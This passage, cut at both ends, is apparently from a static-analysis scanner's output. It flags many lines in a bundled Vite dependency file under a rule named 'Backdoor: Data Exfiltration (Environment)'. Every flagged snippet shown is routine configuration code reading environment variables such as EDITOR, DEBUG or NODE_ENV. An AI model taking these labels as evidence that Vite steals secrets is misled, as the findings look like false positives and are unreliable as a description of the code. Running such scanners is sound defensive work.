            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45165,
                  "startColumn": 6,
                  "endLine": 45165,
                  "endColumn": 17,
                  "snippet": {
                    "text": "  }\n\n  // Last resort, use old skool env vars\n  if (process.env.VISUAL) {\n    return [process.env.VISUAL]\n  } else if (process.env.EDITOR) {\n    return [process.env.EDITOR]\n",
                    "rendered": {
                      "text": "  }\n\n  // Last resort, use old skool env vars\n  if (process.env.VISUAL) {\n    return [process.env.VISUAL]\n  } else if (process.env.EDITOR) {\n    return [process.env.EDITOR]\n",
                      "markdown": "`  }\n\n  // Last resort, use old skool env vars\n  if (process.env.VISUAL) {\n    return [process.env.VISUAL]\n  } else if (process.env.EDITOR) {\n    return [process.env.EDITOR]\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45089,
                  "startColumn": 12,
                  "endLine": 45089,
                  "endColumn": 23,
                  "snippet": {
                    "text": "  }\n\n  if (process.versions.webcontainer) {\n    return [process.env.EDITOR || 'code']\n  }\n\n  // We can find out which editor is currently running by:\n",
                    "rendered": {
                      "text": "  }\n\n  if (process.versions.webcontainer) {\n    return [process.env.EDITOR || 'code']\n  }\n\n  // We can find out which editor is currently running by:\n",
                      "markdown": "`  }\n\n  if (process.versions.webcontainer) {\n    return [process.env.EDITOR || 'code']\n  }\n\n  // We can find out which editor is currently running by:\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45085,
                  "startColumn": 12,
                  "endLine": 45085,
                  "endColumn": 23,
                  "snippet": {
                    "text": "  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [process.env.LAUNCH_EDITOR]\n  }\n\n  if (process.versions.webcontainer) {\n",
                    "rendered": {
                      "text": "  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [process.env.LAUNCH_EDITOR]\n  }\n\n  if (process.versions.webcontainer) {\n",
                      "markdown": "`  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [process.env.LAUNCH_EDITOR]\n  }\n\n  if (process.versions.webcontainer) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45084,
                  "startColumn": 6,
                  "endLine": 45084,
                  "endColumn": 17,
                  "snippet": {
                    "text": "    return shellQuote.parse(specifiedEditor)\n  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [process.env.LAUNCH_EDITOR]\n  }\n\n",
                    "rendered": {
                      "text": "    return shellQuote.parse(specifiedEditor)\n  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [process.env.LAUNCH_EDITOR]\n  }\n\n",
                      "markdown": "`    return shellQuote.parse(specifiedEditor)\n  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [process.env.LAUNCH_EDITOR]\n  }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44109,
                  "startColumn": 22,
                  "endLine": 44109,
                  "endColumn": 33,
                  "snippet": {
                    "text": "      opts.usePolling = !!envLower;\n    }\n  }\n  const envInterval = process.env.CHOKIDAR_INTERVAL;\n  if (envInterval) {\n    opts.interval = Number.parseInt(envInterval, 10);\n  }\n",
                    "rendered": {
                      "text": "      opts.usePolling = !!envLower;\n    }\n  }\n  const envInterval = process.env.CHOKIDAR_INTERVAL;\n  if (envInterval) {\n    opts.interval = Number.parseInt(envInterval, 10);\n  }\n",
                      "markdown": "`      opts.usePolling = !!envLower;\n    }\n  }\n  const envInterval = process.env.CHOKIDAR_INTERVAL;\n  if (envInterval) {\n    opts.interval = Number.parseInt(envInterval, 10);\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44097,
                  "startColumn": 18,
                  "endLine": 44097,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n  // Global override (useful for end-developers that need to force polling for all\n  // instances of chokidar, regardless of usage/dependency depth)\n  const envPoll = process.env.CHOKIDAR_USEPOLLING;\n  if (envPoll !== undefined) {\n    const envLower = envPoll.toLowerCase();\n\n",
                    "rendered": {
                      "text": "\n  // Global override (useful for end-developers that need to force polling for all\n  // instances of chokidar, regardless of usage/dependency depth)\n  const envPoll = process.env.CHOKIDAR_USEPOLLING;\n  if (envPoll !== undefined) {\n    const envLower = envPoll.toLowerCase();\n\n",
                      "markdown": "`\n  // Global override (useful for end-developers that need to force polling for all\n  // instances of chokidar, regardless of usage/dependency depth)\n  const envPoll = process.env.CHOKIDAR_USEPOLLING;\n  if (envPoll !== undefined) {\n    const envLower = envPoll.toLowerCase();\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 43239,
                  "startColumn": 6,
                  "endLine": 43239,
                  "endColumn": 17,
                  "snippet": {
                    "text": "try {\n  fsevents = __require('fsevents');\n} catch (error) {\n  if (process.env.CHOKIDAR_PRINT_FSEVENTS_REQUIRE_ERROR) console.error(error);\n}\n\nif (fsevents) {\n",
                    "rendered": {
                      "text": "try {\n  fsevents = __require('fsevents');\n} catch (error) {\n  if (process.env.CHOKIDAR_PRINT_FSEVENTS_REQUIRE_ERROR) console.error(error);\n}\n\nif (fsevents) {\n",
                      "markdown": "`try {\n  fsevents = __require('fsevents');\n} catch (error) {\n  if (process.env.CHOKIDAR_PRINT_FSEVENTS_REQUIRE_ERROR) console.error(error);\n}\n\nif (fsevents) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 41082,
                  "startColumn": 10,
                  "endLine": 41082,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @private\n */\n\nvar env = process.env.NODE_ENV || 'development';\nvar proto = {};\n\n/* istanbul ignore next */\n",
                    "rendered": {
                      "text": " * @private\n */\n\nvar env = process.env.NODE_ENV || 'development';\nvar proto = {};\n\n/* istanbul ignore next */\n",
                      "markdown": "` * @private\n */\n\nvar env = process.env.NODE_ENV || 'development';\nvar proto = {};\n\n/* istanbul ignore next */\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 40768,
                  "startColumn": 24,
                  "endLine": 40768,
                  "endColumn": 35,
                  "snippet": {
                    "text": "  var opts = options || {};\n\n  // get environment\n  var env = opts.env || process.env.NODE_ENV || 'development';\n\n  // get error callback\n  var onerror = opts.onerror;\n",
                    "rendered": {
                      "text": "  var opts = options || {};\n\n  // get environment\n  var env = opts.env || process.env.NODE_ENV || 'development';\n\n  // get error callback\n  var onerror = opts.onerror;\n",
                      "markdown": "`  var opts = options || {};\n\n  // get environment\n  var env = opts.env || process.env.NODE_ENV || 'development';\n\n  // get error callback\n  var onerror = opts.onerror;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 39744,
                  "startColumn": 11,
                  "endLine": 39744,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\t\t */\n\n\t\tfunction load() {\n\t\t  return process.env.DEBUG;\n\t\t}\n\n\t\t/**\n",
                    "rendered": {
                      "text": "\t\t */\n\n\t\tfunction load() {\n\t\t  return process.env.DEBUG;\n\t\t}\n\n\t\t/**\n",
                      "markdown": "`\t\t */\n\n\t\tfunction load() {\n\t\t  return process.env.DEBUG;\n\t\t}\n\n\t\t/**\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 39732,
                  "startColumn": 6,
                  "endLine": 39732,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\t\t    // string 'null' or 'undefined'. Just delete instead.\n\t\t    delete process.env.DEBUG;\n\t\t  } else {\n\t\t    process.env.DEBUG = namespaces;\n\t\t  }\n\t\t}\n\n",
                    "rendered": {
                      "text": "\t\t    // string 'null' or 'undefined'. Just delete instead.\n\t\t    delete process.env.DEBUG;\n\t\t  } else {\n\t\t    process.env.DEBUG = namespaces;\n\t\t  }\n\t\t}\n\n",
                      "markdown": "`\t\t    // string 'null' or 'undefined'. Just delete instead.\n\t\t    delete process.env.DEBUG;\n\t\t  } else {\n\t\t    process.env.DEBUG = namespaces;\n\t\t  }\n\t\t}\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 39730,
                  "startColumn": 13,
                  "endLine": 39730,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\t\t  if (null == namespaces) {\n\t\t    // If you set a process.env field to null or undefined, it gets cast to the\n\t\t    // string 'null' or 'undefined'. Just delete instead.\n\t\t    delete process.env.DEBUG;\n\t\t  } else {\n\t\t    process.env.DEBUG = namespaces;\n\t\t  }\n",
                    "rendered": {
                      "text": "\t\t  if (null == namespaces) {\n\t\t    // If you set a process.env field to null or undefined, it gets cast to the\n\t\t    // string 'null' or 'undefined'. Just delete instead.\n\t\t    delete process.env.DEBUG;\n\t\t  } else {\n\t\t    process.env.DEBUG = namespaces;\n\t\t  }\n",
                      "markdown": "`\t\t  if (null == namespaces) {\n\t\t    // If you set a process.env field to null or undefined, it gets cast to the\n\t\t    // string 'null' or 'undefined'. Just delete instead.\n\t\t    delete process.env.DEBUG;\n\t\t  } else {\n\t\t    process.env.DEBUG = namespaces;\n\t\t  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 39648,
                  "startColumn": 20,
                  "endLine": 39648,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\t\t *   $ DEBUG_FD=3 node script.js 3>debug.log\n\t\t */\n\n\t\tvar fd = parseInt(process.env.DEBUG_FD, 10) || 2;\n\n\t\tif (1 !== fd && 2 !== fd) {\n\t\t  util.deprecate(function(){}, 'except for stderr(2) and stdout(1), any other usage of DEBUG_FD is deprecated. Override debug.log if you want to use a different log function (https://git.io/debug_fd)')();\n",
                    "rendered": {
                      "text": "\t\t *   $ DEBUG_FD=3 node script.js 3>debug.log\n\t\t */\n\n\t\tvar fd = parseInt(process.env.DEBUG_FD, 10) || 2;\n\n\t\tif (1 !== fd && 2 !== fd) {\n\t\t  util.deprecate(function(){}, 'except for stderr(2) and stdout(1), any other usage of DEBUG_FD is deprecated. Override debug.log if you want to use a different log function (https://git.io/debug_fd)')();\n",
                      "markdown": "`\t\t *   $ DEBUG_FD=3 node script.js 3>debug.log\n\t\t */\n\n\t\tvar fd = parseInt(process.env.DEBUG_FD, 10) || 2;\n\n\t\tif (1 !== fd && 2 !== fd) {\n\t\t  util.deprecate(function(){}, 'except for stderr(2) and stdout(1), any other usage of DEBUG_FD is deprecated. Override debug.log if you want to use a different log function (https://git.io/debug_fd)')();\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 39631,
                  "startColumn": 14,
                  "endLine": 39631,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\t\t    .replace(/_([a-z])/g, function (_, k) { return k.toUpperCase() });\n\n\t\t  // coerce string value into JS value\n\t\t  var val = process.env[key];\n\t\t  if (/^(yes|on|true|enabled)$/i.test(val)) val = true;\n\t\t  else if (/^(no|off|false|disabled)$/i.test(val)) val = false;\n\t\t  else if (val === 'null') val = null;\n",
                    "rendered": {
                      "text": "\t\t    .replace(/_([a-z])/g, function (_, k) { return k.toUpperCase() });\n\n\t\t  // coerce string value into JS value\n\t\t  var val = process.env[key];\n\t\t  if (/^(yes|on|true|enabled)$/i.test(val)) val = true;\n\t\t  else if (/^(no|off|false|disabled)$/i.test(val)) val = false;\n\t\t  else if (val === 'null') val = null;\n",
                      "markdown": "`\t\t    .replace(/_([a-z])/g, function (_, k) { return k.toUpperCase() });\n\n\t\t  // coerce string value into JS value\n\t\t  var val = process.env[key];\n\t\t  if (/^(yes|on|true|enabled)$/i.test(val)) val = true;\n\t\t  else if (/^(no|off|false|disabled)$/i.test(val)) val = false;\n\t\t  else if (val === 'null') val = null;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 39621,
                  "startColumn": 36,
                  "endLine": 39621,
                  "endColumn": 47,
                  "snippet": {
                    "text": "\t\t *   $ DEBUG_COLORS=no DEBUG_DEPTH=10 DEBUG_SHOW_HIDDEN=enabled node script.js\n\t\t */\n\n\t\texports.inspectOpts = Object.keys(process.env).filter(function (key) {\n\t\t  return /^debug_/i.test(key);\n\t\t}).reduce(function (obj, key) {\n\t\t  // camel-case\n",
                    "rendered": {
                      "text": "\t\t *   $ DEBUG_COLORS=no DEBUG_DEPTH=10 DEBUG_SHOW_HIDDEN=enabled node script.js\n\t\t */\n\n\t\texports.inspectOpts = Object.keys(process.env).filter(function (key) {\n\t\t  return /^debug_/i.test(key);\n\t\t}).reduce(function (obj, key) {\n\t\t  // camel-case\n",
                      "markdown": "`\t\t *   $ DEBUG_COLORS=no DEBUG_DEPTH=10 DEBUG_SHOW_HIDDEN=enabled node script.js\n\t\t */\n\n\t\texports.inspectOpts = Object.keys(process.env).filter(function (key) {\n\t\t  return /^debug_/i.test(key);\n\t\t}).reduce(function (obj, key) {\n\t\t  // camel-case\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 39548,
                  "startColumn": 10,
                  "endLine": 39548,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n\t\t  // If debug isn't set in LS, and we're in Electron, try to load $DEBUG\n\t\t  if (!r && typeof process !== 'undefined' && 'env' in process) {\n\t\t    r = process.env.DEBUG;\n\t\t  }\n\n\t\t  return r;\n",
                    "rendered": {
                      "text": "\n\t\t  // If debug isn't set in LS, and we're in Electron, try to load $DEBUG\n\t\t  if (!r && typeof process !== 'undefined' && 'env' in process) {\n\t\t    r = process.env.DEBUG;\n\t\t  }\n\n\t\t  return r;\n",
                      "markdown": "`\n\t\t  // If debug isn't set in LS, and we're in Electron, try to load $DEBUG\n\t\t  if (!r && typeof process !== 'undefined' && 'env' in process) {\n\t\t    r = process.env.DEBUG;\n\t\t  }\n\n\t\t  return r;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34891,
                  "startColumn": 17,
                  "endLine": 34891,
                  "endColumn": 28,
                  "snippet": {
                    "text": "  }\n  for (const key in process.env) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n      env[key] = process.env[key];\n    }\n  }\n  return env;\n",
                    "rendered": {
                      "text": "  }\n  for (const key in process.env) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n      env[key] = process.env[key];\n    }\n  }\n  return env;\n",
                      "markdown": "`  }\n  for (const key in process.env) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n      env[key] = process.env[key];\n    }\n  }\n  return env;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34889,
                  "startColumn": 20,
                  "endLine": 34889,
                  "endColumn": 31,
                  "snippet": {
                    "text": "      env[key] = value;\n    }\n  }\n  for (const key in process.env) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n      env[key] = process.env[key];\n    }\n",
                    "rendered": {
                      "text": "      env[key] = value;\n    }\n  }\n  for (const key in process.env) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n      env[key] = process.env[key];\n    }\n",
                      "markdown": "`      env[key] = value;\n    }\n  }\n  for (const key in process.env) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n      env[key] = process.env[key];\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34882,
                  "startColumn": 26,
                  "endLine": 34882,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n  expand_1({ parsed, processEnv });\n  for (const [key, value] of Object.entries(parsed)) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n",
                    "rendered": {
                      "text": "  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n  expand_1({ parsed, processEnv });\n  for (const [key, value] of Object.entries(parsed)) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n",
                      "markdown": "`  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n  expand_1({ parsed, processEnv });\n  for (const [key, value] of Object.entries(parsed)) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34880,
                  "startColumn": 4,
                  "endLine": 34880,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n  expand_1({ parsed, processEnv });\n",
                    "rendered": {
                      "text": "    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n  expand_1({ parsed, processEnv });\n",
                      "markdown": "`    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n  expand_1({ parsed, processEnv });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34879,
                  "startColumn": 29,
                  "endLine": 34879,
                  "endColumn": 40,
                  "snippet": {
                    "text": "  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n",
                    "rendered": {
                      "text": "  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n",
                      "markdown": "`  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34877,
                  "startColumn": 4,
                  "endLine": 34877,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n",
                    "rendered": {
                      "text": "    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n",
                      "markdown": "`    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34876,
                  "startColumn": 24,
                  "endLine": 34876,
                  "endColumn": 35,
                  "snippet": {
